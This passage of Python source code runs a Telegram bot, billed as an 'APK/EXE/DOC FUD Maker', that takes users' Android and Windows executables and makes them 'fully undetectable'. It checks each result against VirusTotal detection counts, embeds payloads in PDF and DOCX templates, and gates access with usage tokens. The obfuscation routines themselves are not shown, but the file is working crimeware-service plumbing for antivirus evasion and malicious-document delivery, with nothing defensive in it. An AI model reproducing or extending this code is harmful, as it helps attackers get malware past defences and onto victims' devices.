    return ConversationHandler.END

# ============ FILE HANDLERS ============

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    token = context.user_data.get('token')

    if not is_admin(user_id) and not (token and validate_token(token)):
        await update.message.reply_text("❌ Invalid token. Send /start.")
        return ConversationHandler.END

    doc = update.message.document
    if not doc or not doc.file_name.endswith('.apk'):
        keyboard = [[get_cancel_button()]]
        await update.message.reply_text(
            "❌ Please send a valid APK file.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_APK

    status_msg = await update.message.reply_text("📦 Processing APK...\n\n⏳ Starting...", parse_mode='Markdown')

    temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
    apk_path = os.path.join(temp_dir, doc.file_name)
    file_obj = await context.bot.get_file(doc.file_id)
    await file_obj.download_to_drive(apk_path)

    # Progress callback
    async def update_progress(text):
        try:
            await status_msg.edit_text(f"📦 Processing APK...\n\n{text}", parse_mode='Markdown')
        except Exception as e:
            print(f"Progress update error: {e}")

    def sync_progress(text):
        asyncio.create_task(update_progress(text))

    maker = FUDApkMaker(apk_path)
    result = maker.make_fud(progress_callback=sync_progress)

    if not result['success']:
        await status_msg.edit_text(f"❌ Build failed\n\n{result['error']}", parse_mode='Markdown')
        shutil.rmtree(temp_dir, ignore_errors=True)
        return ConversationHandler.END

    vt_result = None
    if VT_API_KEY:
        await update_progress("⏳ Scanning with VirusTotal...")
        vt_result = scan_with_vt(result['file'])
    else:
        await update_progress("⏳ VirusTotal API key not set. Skipping scan.")

    build_id = log_build(
        user_id, user.username or "unknown", token,
        'apk', doc.file_name,
        result['hash_original'], result['hash_fud'],
        vt_result['scan_id'] if vt_result else None,
        vt_result['positives'] if vt_result else None,
        vt_result['total'] if vt_result else None,
        vt_result['link'] if vt_result else None,
        result['size_original'], result['size_fud'],
        'done'
    )

    msg = f"✅ FUD APK Ready!\n\n"
    msg += f"📁 Build #: {build_id}\n"
    msg += f"📦 Original: {doc.file_name}\n"
    msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
    msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
    msg += f"🔑 SHA256: {result['hash_fud'][:16]}...\n"

    if vt_result:
        status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
        msg += f"\n🛡️ VirusTotal:\n"
        msg += f"   {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
        if vt_result['link']:
            msg += f"   🔗 View Report: {vt_result['link']}"
    elif VT_API_KEY:
        msg += f"\n⚠️ VirusTotal scan failed or timed out."

    keyboard = [[get_back_button()], [get_cancel_button()]]
    await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    caption = f"🔥 FUD APK #{build_id}"
    if vt_result:
        caption += f" | {vt_result['positives']}/{vt_result['total']} detections"

    with open(result['file'], 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=f"fud_apk_{build_id}.apk",
            caption=caption
        )

    if CHANNEL_ID:
        try:
            channel_msg = f"🔥 New FUD APK\n\n"
            channel_msg += f"📁 Build #{build_id}\n"
            channel_msg += f"📦 {doc.file_name}\n"
            channel_msg += f"📏 {result['size_fud'] / 1024:.1f} KB\n"
            if vt_result:
                status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
                channel_msg += f"🛡️ {status_icon} {vt_result['positives']}/{vt_result['total']} detections"
            await context.bot.send_message(chat_id=CHANNEL_ID, text=channel_msg, parse_mode='Markdown')
        except:
            pass

    shutil.rmtree(temp_dir, ignore_errors=True)
    if os.path.exists(result['file']):
        os.remove(result['file'])
    if maker.work_dir and os.path.exists(maker.work_dir):
        shutil.rmtree(maker.work_dir, ignore_errors=True)

    return ConversationHandler.END

async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    token = context.user_data.get('token')

    if not is_admin(user_id) and not (token and validate_token(token)):
        await update.message.reply_text("❌ Invalid token. Send /start.")
        return ConversationHandler.END

    doc = update.message.document
    if not doc or not doc.file_name.endswith('.exe'):
        keyboard = [[get_cancel_button()]]
        await update.message.reply_text(
            "❌ Please send a valid EXE file.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_EXE

    status_msg = await update.message.reply_text("💻 Processing EXE...\n\n⏳ Starting...", parse_mode='Markdown')

    temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
    exe_path = os.path.join(temp_dir, doc.file_name)
    file_obj = await context.bot.get_file(doc.file_id)
    await file_obj.download_to_drive(exe_path)

    async def update_progress(text):
        try:
            await status_msg.edit_text(f"💻 Processing EXE...\n\n{text}", parse_mode='Markdown')
        except Exception as e:
            print(f"Progress update error: {e}")

    def sync_progress(text):
        asyncio.create_task(update_progress(text))

    maker = FUDExeMaker(exe_path)
    result = maker.make_fud(progress_callback=sync_progress)

    if not result['success']:
        await status_msg.edit_text(f"❌ Build failed\n\n{result['error']}", parse_mode='Markdown')
        shutil.rmtree(temp_dir, ignore_errors=True)
        return ConversationHandler.END

    vt_result = None
    if VT_API_KEY:
        await update_progress("⏳ Scanning with VirusTotal...")
        vt_result = scan_with_vt(result['file'])

    build_id = log_build(
        user_id, user.username or "unknown", token,
        'exe', doc.file_name,
        result['hash_original'], result['hash_fud'],
        vt_result['scan_id'] if vt_result else None,
        vt_result['positives'] if vt_result else None,
        vt_result['total'] if vt_result else None,
        vt_result['link'] if vt_result else None,
        result['size_original'], result['size_fud'],
        'done'
    )

    msg = f"✅ FUD EXE Ready!\n\n"
    msg += f"📁 Build #{build_id}\n"
    msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
    msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"

    if vt_result:
        status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
        msg += f"\n🛡️ VirusTotal: {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
        if vt_result['link']:
            msg += f"🔗 View Report: {vt_result['link']}"

    keyboard = [[get_back_button()], [get_cancel_button()]]
    await status_msg.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    with open(result['file'], 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=f"fud_exe_{build_id}.exe",
            caption=f"🔥 FUD EXE #{build_id}"
        )

    if CHANNEL_ID:
        try:
            channel_msg = f"🔥 New FUD EXE\n\nBuild #{build_id}\n{result['size_fud'] / 1024:.1f} KB"
            if vt_result:
                status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
                channel_msg += f"\n🛡️ {status_icon} {vt_result['positives']}/{vt_result['total']} detections"
            await context.bot.send_message(chat_id=CHANNEL_ID, text=channel_msg, parse_mode='Markdown')
        except:
            pass

    shutil.rmtree(temp_dir, ignore_errors=True)
    if os.path.exists(result['file']):
        os.remove(result['file'])
    if maker.work_dir and os.path.exists(maker.work_dir):
        shutil.rmtree(maker.work_dir, ignore_errors=True)

    return ConversationHandler.END

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    token = context.user_data.get('token')

    if not is_admin(user_id) and not (token and validate_token(token)):
        await update.message.reply_text("❌ Invalid token. Send /start.")
        return ConversationHandler.END

    doc = update.message.document
    if not doc or not doc.file_name.endswith(('.pdf', '.docx')):
        keyboard = [[get_cancel_button()]]
        await update.message.reply_text(
            "❌ Please send a PDF or DOCX template.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_DOC

    status_msg = await update.message.reply_text("📄 Processing Document...\n\n⏳ Embedding payload...", parse_mode='Markdown')

    temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
    doc_path = os.path.join(temp_dir, doc.file_name)
    file_obj = await context.bot.get_file(doc.file_id)
    await file_obj.download_to_drive(doc_path)

    if doc.file_name.endswith('.pdf'):
        output_path = create_pdf_with_payload(doc_path)
        file_ext = 'pdf'
    else:
        output_path = create_doc_with_payload(doc_path)
        file_ext = 'docx'

    with open(doc_path, 'rb') as f:
        orig_hash = hashlib.sha256(f.read()).hexdigest()
    with open(output_path, 'rb') as f:
        fud_hash = hashlib.sha256(f.read()).hexdigest()

    build_id = log_build(
        user_id, user.username or "unknown", token,
        'doc', doc.file_name,
        orig_hash, fud_hash,
        None, None, None, None,
        os.path.getsize(doc_path), os.path.getsize(output_path),
        'done'
    )

    keyboard = [[get_back_button()], [get_cancel_button()]]
    await status_msg.edit_text(
        f"✅ FUD Document Ready!\n\n"
        f"📁 Build #{build_id}\n"
        f"📦 {doc.file_name}\n"
        f"📏 {os.path.getsize(output_path) / 1024:.1f} KB\n\n"
        f"Payload embedded in metadata.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

    with open(output_path, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=f"fud_doc_{build_id}.{file_ext}",
            caption=f"📄 FUD Document #{build_id}"
        )

    shutil.rmtree(temp_dir, ignore_errors=True)
    if os.path.exists(output_path):
        os.remove(output_path)

    return ConversationHandler.END

async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('gen_token_step'):
        return ConversationHandler.END

    try:
        parts = update.message.text.strip().split()
        days = int(parts[0]) if len(parts) > 0 else 7
        max_uses = int(parts[1]) if len(parts) > 1 else 1
    except:
        keyboard = [[get_cancel_button()]]
        await update.message.reply_text(
            "❌ Invalid. Send: days max_uses",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_GENERATE_TOKEN

    username = update.effective_user.username or "admin"
    token, token_id = create_token(username, days, max_uses)

    keyboard = [[get_back_button()], [get_cancel_button()]]
    await update.message.reply_text(
        f"✅ Token Generated!\n\n"
        f"🔑 {token}\n"
        f"📅 {days} days\n"
        f"🔄 {max_uses} uses\n",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['gen_token_step'] = False
    return ConversationHandler.END

async def handle_revoke_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('revoke_step'):
        return ConversationHandler.END

    token = update.message.text.strip()
    revoke_token(token)
    keyboard = [[get_back_button()], [get_cancel_button()]]
    await update.message.reply_text(
        f"✅ Token {token[:12]}... revoked.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['revoke_step'] = False
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
    return ConversationHandler.END

# ============ BOT RUNNER ============
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def bot_main():
        init_db()
        print("🤖 FUD Maker Bot starting...")
        print(f"👨‍💻 Developer: {DEVELOPER}")
        print(f"🛡️ VirusTotal: {'Enabled' if VT_API_KEY else 'Disabled'}")
        print(f"📢 Channel: {'Configured' if CHANNEL_ID else 'Not set'}")
        print(f"👑 Admin ID: {ADMIN_CHAT_ID}")

        application = Application.builder().token(BOT_TOKEN).build()

        conv = ConversationHandler(
            entry_points=[
                CommandHandler('start', start),
                CommandHandler('help', help_command),
                CallbackQueryHandler(button_handler)
            ],
            states={
                WAITING_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token)],
                WAITING_APK: [MessageHandler(filters.Document.APK, handle_apk)],
                WAITING_EXE: [MessageHandler(filters.Document.ALL, handle_exe)],
                WAITING_DOC: [MessageHandler(filters.Document.ALL, handle_doc)],
                WAITING_GENERATE_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_generate_token)],
            },
            fallbacks=[CommandHandler('cancel', cancel)],
            per_message=False,
            per_chat=True
        )

        application.add_handler(conv)
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))

        # Delete webhook before polling
        await application.bot.delete_webhook()
        print("✅ Webhook deleted.")

        print("🤖 Bot ready, polling...")
        await application.initialize()
        await application.start()

        # Drop pending updates
        await application.updater.start_polling(drop_pending_updates=True)

        while True:
            await asyncio.sleep(1)

    try:
        loop.run_until_complete(bot_main())
    except Exception as e:
        print(f"❌ Bot error: {e}")
        import traceback
        traceback.print_exc()

# ============ MAIN ============
if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║   APK/EXE/DOC FUD Maker — Telegram Bot on Railway                 ║
    ║   Token System | VT Scan | Document FUD | Channel Auto-Post        ║
    ║   Developer: @benji_v1                                            ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """)

    def run_flask():
        port = int(os.environ.get("PORT", 8080))
        app.run(host='0.0.0.0', port=port)

    threading.Thread(target=run_flask, daemon=True).start()
    run_bot()
